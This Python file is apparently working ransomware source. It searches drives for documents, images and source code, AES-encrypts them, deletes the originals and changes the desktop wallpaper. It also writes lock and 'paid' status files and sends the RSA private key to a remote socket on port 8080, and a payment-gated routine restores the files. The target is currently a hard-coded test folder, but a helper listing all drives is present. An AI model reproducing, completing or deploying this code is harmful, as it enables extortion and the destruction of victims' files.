import os
import json
import string
import random
import hashlib
import datetime
import fnmatch
import base64
import ctypes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from ransomware.mysocket import MySocket
from tkinter import ttk

__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
testPath = "./data/"

patterns = ['*.xlsx', '*.docx', '*.doc', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai',"*.pdf","*.json","*.c","*.cpp","*.java","*.js","*.py"]

def checkfile():
    rmfilePath = os.path.join(testPath, "lock.json")
    try:
        with open(rmfilePath, "r") as file:
            data = json.load(file)
            if data["lock"] == 0:
                return 0
            elif data["lock"] == 1 and data["paid"] == 0:
                return 1
            elif data["lock"] == 1 and data["paid"] == 1:
                return 2
    except FileNotFoundError:
        print("No found")
        return 0

def aesKey(length=16):
    return get_random_bytes(length)

def aesEncrypt(key, plaintext_bytes):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    iv = cipher.iv
    return iv + ct_bytes

def aesDecrypt(key, ciphertext):
    iv = ciphertext[:16]
    ct = ciphertext[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt

def rasKey(length=2048):
    return RSA.generate(length)

def rsaEncrypt(aseKey, rasPublicKey):
    cipher = PKCS1_OAEP.new(rasPublicKey)
    return cipher.encrypt(aseKey)

def rsaDecrypt(enAseKey, privateKey):
    privateKey = RSA.import_key(privateKey)
    cipher = PKCS1_OAEP.new(privateKey)
    return cipher.decrypt(enAseKey)

def getAvaiblableDrives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = letter + ":/"
        if os.path.exists(drive):
            drives.append(drive)
    drives.remove("C:/")
    drives.append(f"C:/Users/{os.getlogin()}/Documents")
    return drives

class CreateFile:
    def __init__(self, path):
        self.path = path

    def checkfile(self, fileName, length=16):
        rmfilePath = os.path.join(self.path, fileName)
        letters_and_digits = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
        id = hashlib.sha256(random_string.encode()).hexdigest()
        data = {
            "lock": 1,
            "paid": 0,
            "lockTime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "UID": id
        }
        with open(rmfilePath, "w") as file:
            json.dump(data, file, indent=4)

    def randomID(self, fileName, length=16):
        letters_and_digits = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
        id = hashlib.sha256(random_string.encode()).hexdigest()
        rmfilePath = os.path.join(self.path, fileName)
        data = {"id": id}
        with open(rmfilePath, "w") as file:
            json.dump(data, file, indent=4)

    def writeKeyFile(self, key):
        rmfilePath = os.path.join(self.path, "key.json")
        key_base64 = base64.b64encode(key).decode('utf-8')  # Convert bytes to a base64 encoded string
        data = {"key": key_base64}
        with open(rmfilePath, "w") as file:
            json.dump(data, file, indent=4)

    def readFile(self):
        rmfilePath = os.path.join(self.path, "lock.json")
        with open(rmfilePath, "r") as file:
            return json.load(file)

def runEncryption():
    print("Encryption start")
    img = os.path.abspath("./images/snake.png")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 3)
    cf = CreateFile(testPath)
    cf.checkfile("lock.json")
    drives = ["E:\\test"]  # For testing purpose
    print(drives)
    fileNumber = 0
    aseKey = aesKey()
    fileName = []
    for drive in drives:
        for root, _, files in os.walk(drive):
            for pattern in patterns:
                for filename in fnmatch.filter(files, pattern):
                    file_path = os.path.join(root, filename)
                    try:
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                        if not file_data:
                            print(f"File {file_path} is empty, skipping.")
                            continue
                        encrypted_data = aesEncrypt(aseKey, file_data)
                        with open(file_path + '.enc', 'wb') as ef:
                            ef.write(encrypted_data)
                        fileName.append(file_path + ".enc")
                        fileNumber += 1
                        os.remove(file_path)
                        # print(f"File {file_path} encrypted successfully.")
                    except Exception as e:
                        print(f"Error processing file {file_path}: {e}")

    with open(testPath + "filepath.txt", "w", encoding="utf-8") as file:
        for item in fileName:
            file.write(f"{item}\n")

    ras_key = rasKey()
    publicKey = ras_key.publickey()
    enkey = rsaEncrypt(aseKey, publicKey)
    cf.writeKeyFile(enkey)
    data = cf.readFile()
    sendData = {
        "getPrivate":False,
        "UID": data["UID"],
        "fileNumber": fileNumber,
        "privateKey": ras_key.export_key().decode('utf-8'),
        "lockTime": data["lockTime"],
        "padding": False
    }
    print(sendData)
    client = MySocket.Client()
    client.sendTCPMeg(sendData, 8080)

def runDecryption(tk_root, privateKey):
    print("Decryption start")
    #print(f"Using private key: {privateKey[:30]}...")
    rmfilePath = os.path.join(testPath, "lock.json")
    with open(rmfilePath, "r", encoding="utf-8") as file:
        data = json.load(file)
    data["paid"] = 1
    with open(rmfilePath, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4)

    rmfilePath = os.path.join(testPath, "key.json")
    with open(rmfilePath, "r", encoding="utf-8") as file:
        enkey = json.load(file)
    
    aes_key = base64.b64decode(enkey["key"])
    aes_key = rsaDecrypt(aes_key,privateKey)

    rmfilePath = os.path.join(testPath, "filepath.txt")
    filepath = []
    with open(rmfilePath, "r", encoding="utf-8") as file:
        for line in file:
            filepath.append(line.strip())
    #print(len(filepath))

    progress = ttk.Progressbar(tk_root, orient="horizontal", length=300, mode="determinate")
    progress.pack(pady=20)
    progress["maximum"] = len(filepath)

    for i, file_path in enumerate(filepath):
        try:
            with open(file_path, "rb") as encrypted_file:
                encrypted_data = encrypted_file.read()
            
            decrypted_data = aesDecrypt(aes_key, encrypted_data)
            
            new_file_path = file_path[:-4]
            with open(new_file_path, "wb") as decrypted_file:
                decrypted_file.write(decrypted_data)
            os.remove(file_path)
            #print(f"Decrypted {file_path} successfully.")
        except Exception as e:
            print(f"Error decrypting file {file_path}: {e}")

        progress["value"] = i + 1
        tk_root.update_idletasks()
    tk_root.destroy()